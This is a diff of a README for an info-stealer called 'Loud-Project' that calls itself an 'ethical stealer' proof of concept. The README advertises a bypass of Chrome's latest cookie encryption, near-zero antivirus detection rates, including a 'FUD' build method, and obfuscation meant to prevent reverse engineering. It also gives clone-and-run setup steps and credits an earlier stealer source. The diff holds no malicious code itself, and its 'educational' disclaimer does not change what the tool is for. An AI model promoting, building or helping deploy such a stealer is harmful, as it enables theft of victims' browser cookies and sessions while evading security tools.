@@ -10,20 +10,81 @@ This project is a **Proof of Concept** and **intended for educational purposes o
 
 The author is not responsible for any misuse or damages caused by the use of this software. It is your responsibility to ensure that the usage complies with all applicable laws and regulations.
 
+---
+
+## 📚 Table of Contents
+
+- [🚀 Features](#features-)
+- [⚙️ Installation](#installation-)
+- [🖥️ How to Run](#how-to-run-)
+- [👀 Preview](#preview-)
+- [🏎️ Why Bun is Incredible](#why-bun-is-incredible-)
+- [✨ Mentions](#mentions-)
+- [📱 Contact](#contact-)
+
+---
+
 ## Features 🚀
 
 - **Ethical Stealer**: A tool designed for educational and proof of concept purposes.
 - **Bypasses Chrome's Latest Cookie Encryption**: Leveraging **Bun** for its rapid speed and robust obfuscation to bypass modern encryption techniques used by Chrome.
-- **Compiled with Bun and `pkg`**: Offering minimal detection rates (0% with Bun, 2% with `pkg`).
-- **Obfuscation**: Using `javascript-obfuscator` for basic obfuscation to prevent reverse engineering.
+- **Compiled with Bun and `pkg`**: Offering minimal detection rates (0/71 with Bun, 2/71 with `pkg`).
+- **New special detection bypass with `pkg-fud-method`**: Offering 0 detection rates.
+- **Obfuscation**: Using `javascript-obfuscator` & `js-confuser` for basic => hard obfuscation to prevent reverse engineering.
+
+## Installation ⚙️
+
+Before you begin, ensure that you have the following dependencies installed:
+
+1. **Python 3.9 or above**: You can download the latest version of Python from [python.org](https://www.python.org/downloads/).
+
+2. **Node.js Version lower than v21 (v16 recommended)**: Download and install Node.js from [Node.js v16 download](https://nodejs.org/dist/v16.20.2/node-v16.20.2-x64.msi).
+
+3. [**Visual Studio Installer**](https://visualstudio.microsoft.com/downloads/) (for C++ support): Download and install Visual Studio with the **Desktop development with C++** workload. This is required for building and compiling C++ modules in the project.  
+   ![cpp](https://i.imgur.com/ohtkvIf.png)
+
+4. **Bun**: This will be automatically installed when you run the `start.bat` script.
+
+5. **`pkg`**: Also installed automatically via the `start.bat` script.
+
+To install all dependencies:
+- Run `start.bat` to install electron, Bun, and `pkg` automatically.
+
+
+## How to Run 🖥️
+
+1. **Clone the repository**:
+   ```bash
+   git clone https://github.com/wompless/Loud-Project.git
+   cd Loud-Project
+   ```
+
+2. **Install dependencies**:
+   ```bash
+   node install.js
+   ```
+
+3. **Start the application**:
+   - Recommended: Run `start.bat` to handle everything.
+   - Or manually run:
+     ```bash
+     npm start
+     ```
+
+4. A GUI built with **Electron** will open where you can interact with the tool.
+
 
 ## Preview 👀
 
-### Bun Build Detection (0% Detection)
+### Bun Build Detection (0/70 Detection)
 
 ![Bun Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/BunBuildDetection%20.png)
 
-### Pkg Build Detection (2% Detection)
+### Pkg-fud-method Build Detection (0/70 Detection)
+
+![Pkg-fud-method Build Detection](https://i.imgur.com/GpBku5u.png)
+
+### Pkg Build Detection (2/70 Detection)
 
 ![Pkg Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/PkgBuildDetection.png)
 
@@ -38,72 +99,32 @@ The author is not responsible for any misuse or damages caused by the use of thi
 ![logs2](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(2).png)
 
 
-## Installation ⚙️
-
-Before you begin, ensure that you have the following dependencies installed:
-
-1. **Python 3.9 or above**: You can download the latest version of Python from [python.org](https://www.python.org/downloads/).
-
-2. **Node.js Version lower than v21 (v16 recommended)**: Download and install Node.js from [Node.js v16 download](https://nodejs.org/dist/v16.20.2/node-v16.20.2-x64.msi).
-
-3. [**Visual Studio Installer**](https://visualstudio.microsoft.com/downloads/) (for C++ support): Download and install Visual Studio with the **Desktop development with C++** workload. This is required for building and compiling C++ modules in the project.
-![cpp](https://i.imgur.com/ohtkvIf.png)
-
-
-4. **Bun**: This will be automatically installed when you run the `start.bat` script. Bun provides lightning-fast builds and optimizes the execution of JavaScript code, making it ideal for this proof of concept.
-
-5. **`pkg`**: Also installed automatically via the `start.bat` script. `pkg` is used for compiling the project into an executable file.
-
-To install all dependencies, simply run the following:
-
-- Download the required installers and follow their installation steps.
-- Then, run `start.bat` to install Python, Bun, and `pkg` automatically.
-
-## How to Run 🖥️
-
-1. **Clone the repository**:
-   `git clone https://github.com/wompless/Loud-Project.git`
-
-   `cd Loud-Project`
-
-2. **Install dependencies**:
-   After ensuring that you have Python, Node.js, and Visual Studio installed, run the following to install all necessary Node.js modules:
-   `npm install`
-
-3. **Start the application**:
-   - For a simple launch, just run `start.bat`, which will handle everything for you, including starting the application and installing dependencies.
-   - Alternatively, you can start the application manually via:
-     `npm start`
-
-4. The application will open a GUI built with **Electron**, where you can interact with the tool.
-
 ## Why Bun is Incredible 🏎️
 
-**Bun** is a modern, ultra-fast JavaScript runtime that is built from scratch with performance in mind. By using Bun, we achieve **significant speed improvements** in both the execution of JavaScript code and the build process, which is critical when dealing with a proof-of-concept project like this one.
+**Bun** is a modern, ultra-fast JavaScript runtime. By using Bun, we achieve **significant speed improvements** in both execution and build times.
 
-With **Bun**, the detection rate of the compiled executable is **0%**, making it incredibly stealthy and bypassing advanced detection mechanisms. 
+- **Detection rate with Bun: 0%**
+- **Detection rate with pkg: 2%**
 
-In contrast, using **pkg** for compiling results in a **2% detection rate**, but still provides a fast and effective solution for bundling the application into an executable file.
-
-**Bun** optimizes the encryption bypass process, particularly in dealing with Chrome’s **latest cookie encryption**, which was previously a challenge to overcome. By leveraging Bun's efficiency, we are able to execute decryption tasks with **minimal overhead**.
+It optimizes Chrome cookie decryption bypasses with **minimal overhead**.
 
 ## Mentions ✨
- 
-I would like to give special thanks to the following individuals who have greatly contributed to the development of this project:
- 
- - **Kisakay**: [GitHub Profile](https://github.com/Kisakay)
- - **TanevAZ**: [GitHub Profile](https://github.com/TanevAZ)
- - **VInzui**: [GitHub Profile](https://github.com/Vinzui)
- - **covllld**: [GitHub Profile](https://github.com/covllld)
- 
-Additionally, a shoutout to **Wave** for the stealer source that helped in shaping this project.
- 
+
+Special thanks to:
+
+- **Kisakay**: [GitHub](https://github.com/Kisakay)
+- **TanevAZ**: [GitHub](https://github.com/TanevAZ)
+- **VInzui**: [GitHub](https://github.com/Vinzui)
+- **covllld**: [GitHub](https://github.com/covllld)
+
+And shoutout to **Wave** for the base source inspiration.
+
 ## Contact 📱
 
-If you have any questions, concerns, or abuse reports, please contact us via Telegram:
+If you have any questions or abuse reports:
 
-[Telegram: @LoudProject](https://t.me/LoudProject)
+👉 [Telegram: @LoudProject](https://t.me/LoudProject)
 
 ---
 
-**Note:** This is a **Proof of Concept**. It should only be used for educational purposes in a controlled environment.
+**Note:** This is a **Proof of Concept**. Use only in a secure, educational setting.
